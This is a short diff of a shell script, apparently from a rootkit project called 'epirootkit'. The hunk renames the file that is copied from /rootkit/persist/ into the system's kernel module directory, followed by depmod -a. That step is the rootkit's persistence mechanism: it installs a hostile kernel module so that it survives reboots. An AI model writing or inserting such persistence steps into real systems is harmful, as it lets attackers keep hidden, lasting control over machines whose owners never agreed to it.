@@ -18,7 +18,7 @@ fi
 if [[ ! -f "$MOD_PATH/epirootkit.ko" ]]; then
   # nothing to do here
   echo "copying module to lib"
-  cp /rootkit/persist/rootkit.ko "$MOD_PATH"
+  cp /rootkit/persist/epirootkit.ko "$MOD_PATH"
   depmod -a
 fi
 
